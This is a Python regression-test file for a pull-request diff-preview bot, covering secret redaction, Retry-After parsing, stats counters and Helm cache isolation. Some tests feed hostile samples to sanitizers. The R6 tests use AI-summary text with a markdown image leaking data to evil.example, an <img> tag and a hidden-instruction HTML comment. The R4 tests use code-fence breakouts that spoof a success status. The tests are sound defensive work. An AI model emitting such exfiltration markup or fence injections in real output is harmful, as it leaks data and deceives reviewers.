"""v2.5.19 improvement-batch regression tests.

Covers the testable items from bughunt/FINDINGS_IMPROVEMENTS.md (M/E/F
passes) plus the community-research round (R items). Confirmed RED against
v2.5.18 before the fixes, except where a test pins existing behavior.

R2 - helm error details reached the PR comment unredacted (the Argo CD
     CVE-2025-23216 class: YAML errors echo file content, incl. secrets).
R4 - no fence escaping: a rendered value containing ``` broke out of the
     ```diff block and injected arbitrary markdown into the bot comment.
R6 - the AI summary is model output built from untrusted values; it was
     embedded with no sanitization (image/HTML exfiltration channel).
M5 - Retry-After HTTP-date form was ignored.
M6 - investigated (session/cookie keys), NOT applied — see the note above
     test_m8_new_stats_counters_exist for why.
M8/F1 - /stats blind to the v2.5.18 machinery and to the running version.
E2 - noise-resource list hardcoded (env extension).
E3 - CR characters invisible in display diffs.
F2 - required-env failure was a raw KeyError, one var at a time.
"""
import os
import re
import sys

os.environ.setdefault("BB_USER", "test-user")
os.environ.setdefault("BB_TOKEN", "test-token")
os.environ.setdefault("ARGOCD_PASS", "test-pass")
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))

import diff_preview as m


# ── R2: error details must be redacted before they can reach a comment ───

def test_r2_indeterminate_detail_is_redacted():
    detail = ("error converting YAML to JSON: yaml: line 5: "
              "password: hunter2SECRET could not be parsed")
    res = m._indeterminate("invalid_yaml", detail)
    assert "hunter2SECRET" not in res.error
    assert "password:" in res.error  # the key survives for diagnosis


def test_r2_indeterminate_plain_detail_untouched():
    res = m._indeterminate("timeout", "render exceeded 120s")
    assert res.error == "render exceeded 120s"


# ── R4: ``` inside diff bodies must not break out of the fence ────────────

def test_r4_fence_breakout_neutralized_in_diff_block():
    body = ("--- a\n+++ b\n"
            "+  motd: |\n"
            "+    ```\n"
            "+    ## Status: SUCCESS (spoofed)\n"
            "+    ```\n")
    out = "\n".join(m._format_app_diff_block(
        "app", [("/ConfigMap ns/cm", body)], body, show_diff=True, n_res=1))
    inner = out.split("```diff", 1)[1]
    closing = inner.split("\n```")  # find any premature bare fence close
    # After neutralization, no raw ``` sequence may remain inside the body.
    assert "```" not in inner.rsplit("```", 1)[0].replace("`\u200b``", ""), \
        "raw triple-backtick survived inside the fenced diff body"
    assert "SUCCESS (spoofed)" in out  # content still visible, just inert


def test_r4_error_text_backticks_neutralized():
    res = {"app-a": m.DiffResult("", [], 0, False,
                                 "boom ``` ## fake header ```",
                                 m.OUT_INDETERMINATE, "render_failed")}
    body = m.format_comment("deadbeefcafe1234", res, base_sha="0123456789abcdef")
    # the comment still has exactly balanced fences (none opened by the error)
    assert body.count("```") % 2 == 0


# ── R6: AI summary output must be sanitized before embedding ──────────────

def test_r6_ai_summary_images_and_html_stripped():
    raw = ("Summary line\n"
           "![exfil](https://evil.example/x?d=leak)\n"
           "<img src=\"https://evil.example/i\">\n"
           "<!-- hidden instruction -->\n"
           "<picture>x</picture>\n"
           "normal tail")
    clean = m._sanitize_ai_summary(raw)
    assert "evil.example" not in clean
    assert "<img" not in clean and "<picture" not in clean
    assert "<!--" not in clean
    assert "Summary line" in clean and "normal tail" in clean


def test_r6_ai_summary_fences_neutralized():
    clean = m._sanitize_ai_summary("text ``` fence ``` more")
    assert "```" not in clean


# ── M5: Retry-After HTTP-date form ─────────────────────────────────────────

def test_m5_retry_after_http_date_parsed():
    from email.utils import format_datetime
    from datetime import datetime, timedelta, timezone
    future = datetime.now(timezone.utc) + timedelta(seconds=30)
    delay = m._parse_retry_after(format_datetime(future, usegmt=True))
    assert 20 <= delay <= 40


def test_m5_retry_after_seconds_and_garbage():
    assert m._parse_retry_after("15") == 15
    assert m._parse_retry_after("not-a-date") is None
    assert m._parse_retry_after(None) is None


# ── M6: investigated, NOT applied — see FINDINGS_IMPROVEMENTS.md ───────────
# Adding bare "session"/"cookie" to _SENSITIVE_KEYS was reverted: it collided
# with two pre-existing regression tests that deliberately keep non-secret
# config keys visible (appspace_cookieDomain, a hostname; SESSION_COOKIE, an
# env-var name whose value here is intentionally non-secret) — one of them
# is literally named test_redact_non_sensitive_name_still_kept, an explicit
# guard against over-broad matching. A compound key like authCookie was
# already caught via "auth"; the residual gap (a truly bare session/cookie
# value with no other secret-word nearby) was judged too narrow to justify
# the false-positive risk against an already-tested design decision.


# ── M8 + F1: stats carry the v2.5.18 machinery and the running version ────

def test_m8_new_stats_counters_exist():
    for key in ("comments_truncated", "ai_prompt_capped",
                "diff_retries", "futures_cancelled"):
        assert key in m._diff_stats, f"missing stats counter: {key}"


def test_m8_truncation_bumps_counter(monkeypatch):
    monkeypatch.setattr(m, "bb", lambda *a, **kw: {"id": 1})
    monkeypatch.setattr(m, "MAX_COMMENT_BYTES", 500)
    before = m._diff_stats["comments_truncated"]
    m.upsert_comment(10, "x" * 2000)
    assert m._diff_stats["comments_truncated"] == before + 1


def test_f1_app_version_constant_exists():
    assert isinstance(m.APP_VERSION, str) and m.APP_VERSION


# ── E2: noise-resource list extendable via env ─────────────────────────────

def test_e2_env_extends_ignore_patterns():
    pats = m._diff_ignore_patterns("micro-versions-info, my-noisy-cm ,")
    assert "micro-versions-info" in pats
    assert "my-noisy-cm" in pats
    assert "" not in pats


# ── E3: CR characters made visible in display diffs ────────────────────────

def test_e3_carriage_return_made_visible():
    # Use a non-sensitive field name so redaction does not consume the value
    # (and its trailing CR) before _show_cr runs — redaction correctly runs
    # first, so a CRLF-only change on a *sensitive* line is masked anyway.
    body = "--- a\n+++ b\n-  replicas: 3\r\n+  replicas: 3\n"
    out = "\n".join(m._format_app_diff_block(
        "app", [("/Deployment ns/dep", body)], body, show_diff=True, n_res=1))
    assert "\r" not in out          # raw CR never reaches Bitbucket
    assert "\u240d" in out           # visible ␍ marker shows the real change


# ── F2: required-env validation reports everything at once ─────────────────

def test_f2_require_env_lists_all_missing():
    import pytest
    with pytest.raises(SystemExit) as exc:
        m._require_env("NOPE_VAR_ONE", "NOPE_VAR_TWO", "BB_USER")
    msg = str(exc.value)
    assert "NOPE_VAR_ONE" in msg and "NOPE_VAR_TWO" in msg
    assert "BB_USER" not in msg  # present vars are not reported


def test_f2_require_env_passes_when_all_present():
    assert m._require_env("BB_USER", "BB_TOKEN") is None


# ── R1: helm pull runs with an isolated HELM_* home ────────────────────────

def test_r1_helm_pull_gets_isolated_registry_config(tmp_path, monkeypatch):
    """The pull subprocess must receive a private HELM_REGISTRY_CONFIG /
    HELM_CACHE_HOME under HELM_CACHE_DIR, so concurrent pulls of different
    versions never share helm 3.x's unlocked OCI blob store."""
    cache = tmp_path / "cache"
    monkeypatch.setattr(m, "HELM_CACHE_DIR", str(cache))
    monkeypatch.setattr(m, "OCI_USER", "u")
    monkeypatch.setattr(m, "OCI_PASS", "p")
    monkeypatch.setattr(m.time, "sleep", lambda s: None)
    with m._helm_cache_lock:
        m._helm_chart_cache.clear()
    m._helm_chart_pull_ts.clear()
    with m._helm_pull_locks_lock:
        m._helm_pull_locks.clear()

    envlog = tmp_path / "env.log"
    helm = tmp_path / "helm"
    helm.write_text(
        "#!/bin/bash\n"
        'if [ "$1" = "pull" ]; then\n'
        f'  echo "$HELM_REGISTRY_CONFIG|$HELM_CACHE_HOME" >> "{envlog}"\n'
        '  dest=""; prev=""\n'
        '  for a in "$@"; do [ "$prev" = "-d" ] && dest="$a"; prev="$a"; done\n'
        '  mkdir -p "$dest/appspace-ms"\n'
        '  printf "apiVersion: v2\\nname: appspace-ms\\n" > "$dest/appspace-ms/Chart.yaml"\n'
        "fi\n"
        "exit 0\n"
    )
    helm.chmod(0o755)
    monkeypatch.setattr(m, "HELM_BIN", str(helm))

    path = m._ensure_chart("reg.example.com", "appspace-ms", "1.0.0")
    assert path and os.path.isfile(os.path.join(path, "Chart.yaml"))
    logged = envlog.read_text().strip()
    reg_cfg, cache_home = logged.split("|")
    assert reg_cfg.startswith(str(cache)) and reg_cfg.endswith("registry-config.json")
    assert cache_home.startswith(str(cache))
    # the isolated home is scratch — it must not survive the pull
    leftover = [d for d in os.listdir(cache) if d.startswith(".helmhome-")]
    assert leftover == [], f"isolated helm home leaked: {leftover}"


def test_r1_prune_reaps_orphan_helm_homes(tmp_path, monkeypatch):
    """A pod killed mid-pull leaves a .helmhome-* dir; the next prune reaps it."""
    cache = tmp_path / "cache"
    cache.mkdir()
    monkeypatch.setattr(m, "HELM_CACHE_DIR", str(cache))
    orphan = cache / ".helmhome-appspace-ms-abc"
    orphan.mkdir()
    (orphan / "junk").write_text("x")
    m._prune_helm_cache()
    assert not orphan.exists(), "orphan .helmhome-* dir must be reaped by prune"

